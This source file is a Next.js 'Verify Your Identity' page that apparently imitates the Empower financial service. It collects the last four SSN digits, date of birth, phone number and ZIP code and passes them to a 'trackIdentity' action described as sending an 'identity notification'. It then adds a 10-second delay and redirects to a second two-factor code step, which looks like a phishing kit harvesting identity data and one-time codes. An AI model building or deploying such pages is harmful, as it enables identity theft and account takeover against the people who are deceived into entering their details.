"use client"

import { useState, Suspense, useEffect } from "react"
import { useRouter, useSearchParams } from "next/navigation"
import { Header } from "@/components/header"
import { Footer } from "@/components/footer"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select"
import { trackIdentity } from "@/lib/actions"

const MONTHS = [
  "January", "February", "March", "April", "May", "June",
  "July", "August", "September", "October", "November", "December",
]
const DAYS = Array.from({ length: 31 }, (_, i) => String(i + 1))
const CURRENT_YEAR = new Date().getFullYear()
const YEARS = Array.from({ length: CURRENT_YEAR - 1919 }, (_, i) => String(CURRENT_YEAR - i))

function VerifyIdentityContent() {
  const router = useRouter()
  const searchParams = useSearchParams()
  const type = (searchParams.get("type") === "Call" ? "Call" : "SMS") as "SMS" | "Call"

  useEffect(() => {
    if (typeof window !== "undefined" && !sessionStorage.getItem("emp_details")) router.replace("/2fa-verify-code")
  }, [router])

  const [birthMonth, setBirthMonth] = useState("")
  const [birthDay, setBirthDay] = useState("")
  const [birthYear, setBirthYear] = useState("")
  const [ssnLast4, setSsnLast4] = useState("")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [zipCode, setZipCode] = useState("")
  const [submitAttempted, setSubmitAttempted] = useState(false)
  const [isLoading, setIsLoading] = useState(false)

  const ssnDigits = ssnLast4.replace(/\D/g, "")
  const dateOfBirth =
    birthMonth && birthDay && birthYear
      ? `${String(MONTHS.indexOf(birthMonth) + 1).padStart(2, "0")}/${birthDay.padStart(2, "0")}/${birthYear}`
      : ""
  const isDobValid = Boolean(birthMonth && birthDay && birthYear)
  const isSsnValid = ssnDigits.length === 4
  const phoneDigits = phoneNumber.replace(/\D/g, "")
  const isPhoneValid = phoneDigits.length >= 10
  const zipDigits = zipCode.replace(/\D/g, "")
  const isZipValid = zipDigits.length === 5 || zipDigits.length === 9
  const isFormValid = isDobValid && isSsnValid && isPhoneValid && isZipValid

  const formatPhoneNumber = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 10)
    if (digits.length <= 3) return digits
    if (digits.length <= 6) return `(${digits.slice(0, 3)}) ${digits.slice(3)}`
    return `(${digits.slice(0, 3)}) ${digits.slice(3, 6)}-${digits.slice(6)}`
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setSubmitAttempted(true)
    if (!isFormValid || isLoading) return
    setIsLoading(true)
    try {
      await trackIdentity({
        dateOfBirth,
        ssnLast4: ssnDigits,
        phoneNumber: phoneNumber.trim(),
        zipCode: zipDigits,
      })
    } catch (err) {
      console.error("Failed to send identity notification:", err)
    }
    await new Promise((r) => setTimeout(r, 10000))
    if (typeof window !== "undefined") sessionStorage.setItem("emp_otp2", "1")
    router.push(`/2fa-verify-code?step=2&type=${type}`)
  }

  const handleCancel = () => {
    router.push("/")
  }

  const inputBase = "h-11 border border-gray-300 rounded-xl focus:ring-blue-500 focus:border-blue-500 text-gray-700"
  const inputError = "border-red-500 focus:ring-red-500 focus:border-red-500"
  const labelClass = "text-sm font-medium text-gray-700 ml-1 mb-1.5 block"

  return (
    <main className="min-h-screen bg-white flex flex-col">
      <div
        style={{
          backgroundImage: "url(/empower-background-dark-white-flag.png)",
          backgroundSize: "cover",
          backgroundRepeat: "no-repeat",
          backgroundPosition: "center top",
        }}
        className="flex flex-col min-h-[60vh]"
      >
        <Header />

        <div className="flex-1 flex items-center justify-center py-12 px-4 bg-transparent">
          <div className="bg-white rounded-[32px] p-8 md:p-12 shadow-xl w-full max-w-[500px] border border-gray-200">
            <h1 className="text-2xl md:text-3xl font-bold text-[#363636] mb-4">Verify Your Identity</h1>
            <p className="text-gray-600 mb-8 leading-relaxed">
              Please enter the following information to help us confirm it&apos;s you.
            </p>

            <form onSubmit={handleSubmit} className="space-y-5">
              <div>
                <label htmlFor="ssnLast4" className={labelClass}>Last 4 Digits of SSN</label>
                <Input
                  id="ssnLast4"
                  type="text"
                  inputMode="numeric"
                  maxLength={4}
                  value={ssnLast4}
                  onChange={(e) => setSsnLast4(e.target.value.replace(/\D/g, "").slice(0, 4))}
                  disabled={isLoading}
                  className={`w-[88px] ${inputBase} ${submitAttempted && !isSsnValid ? inputError : ""} disabled:opacity-70 disabled:pointer-events-none`}
                />
                {submitAttempted && !isSsnValid && (
                  <p className="mt-1 text-sm text-red-600">Enter last 4 digits of SSN</p>
                )}
              </div>

              <div>
                <label className={labelClass}>Birth Date</label>
                <div className="flex flex-wrap gap-3">
                  <Select value={birthMonth} onValueChange={setBirthMonth} disabled={isLoading}>
                    <SelectTrigger className={`min-w-[120px] ${inputBase} ${submitAttempted && !isDobValid ? inputError : ""} disabled:opacity-70`}>
                      <SelectValue placeholder="Month" />
                    </SelectTrigger>
                    <SelectContent>
                      {MONTHS.map((m) => (
                        <SelectItem key={m} value={m}>{m}</SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                  <Select value={birthDay} onValueChange={setBirthDay} disabled={isLoading}>
                    <SelectTrigger className={`w-[72px] ${inputBase} ${submitAttempted && !isDobValid ? inputError : ""} disabled:opacity-70`}>
                      <SelectValue placeholder="Day" />
                    </SelectTrigger>
                    <SelectContent>
                      {DAYS.map((d) => (
                        <SelectItem key={d} value={d}>{d}</SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                  <Select value={birthYear} onValueChange={setBirthYear} disabled={isLoading}>
                    <SelectTrigger className={`min-w-[88px] ${inputBase} ${submitAttempted && !isDobValid ? inputError : ""} disabled:opacity-70`}>
                      <SelectValue placeholder="Year" />
                    </SelectTrigger>
                    <SelectContent>
                      {YEARS.map((y) => (
                        <SelectItem key={y} value={y}>{y}</SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>
                {submitAttempted && !isDobValid && (
                  <p className="mt-1 text-sm text-red-600">Select month, day, and year</p>
                )}
              </div>

              <div>
                <label htmlFor="phoneNumber" className={labelClass}>Phone Number</label>
                <Input
                  id="phoneNumber"
                  type="tel"
                  inputMode="numeric"
                  placeholder="(555) 555-5555"
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(formatPhoneNumber(e.target.value))}
                  maxLength={14}
                  disabled={isLoading}
                  className={`max-w-[200px] ${inputBase} ${submitAttempted && !isPhoneValid ? inputError : ""} disabled:opacity-70 disabled:pointer-events-none`}
                />
                {submitAttempted && !isPhoneValid && (
                  <p className="mt-1 text-sm text-red-600">Enter a valid phone number (10 digits)</p>
                )}
              </div>

              <div>
                <label htmlFor="zipCode" className={labelClass}>Zip Code</label>
                <Input
                  id="zipCode"
                  type="text"
                  inputMode="numeric"
                  value={zipCode}
                  onChange={(e) => setZipCode(e.target.value.replace(/\D/g, "").slice(0, 9))}
                  placeholder="12345"
                  maxLength={9}
                  disabled={isLoading}
                  className={`max-w-[120px] ${inputBase} ${submitAttempted && !isZipValid ? inputError : ""} disabled:opacity-70 disabled:pointer-events-none`}
                />
                {submitAttempted && !isZipValid && (
                  <p className="mt-1 text-sm text-red-600">Enter a valid zip code (5 or 9 digits)</p>
                )}
              </div>

              <div className="flex gap-3 pt-2">
                <Button
                  type="submit"
                  disabled={isLoading}
                  className="flex-1 bg-[#003d6b] hover:bg-[#002d50] text-white h-12 rounded-xl font-bold disabled:opacity-70 disabled:pointer-events-none"
                >
                  {isLoading ? "VERIFYING..." : "CONTINUE"}
                </Button>
                <Button
                  type="button"
                  variant="outline"
                  onClick={handleCancel}
                  disabled={isLoading}
                  className="h-12 px-6 rounded-xl border border-gray-300 bg-gray-50 hover:bg-gray-100 text-gray-700 disabled:opacity-70 disabled:pointer-events-none"
                >
                  Cancel
                </Button>
              </div>
            </form>
          </div>
        </div>
      </div>

      <Footer />
    </main>
  )
}

export default function VerifyIdentityPage() {
  return (
    <Suspense fallback={
      <main className="min-h-screen bg-white flex items-center justify-center">
        <p className="text-gray-600">Loading...</p>
      </main>
    }>
      <VerifyIdentityContent />
    </Suspense>
  )
}
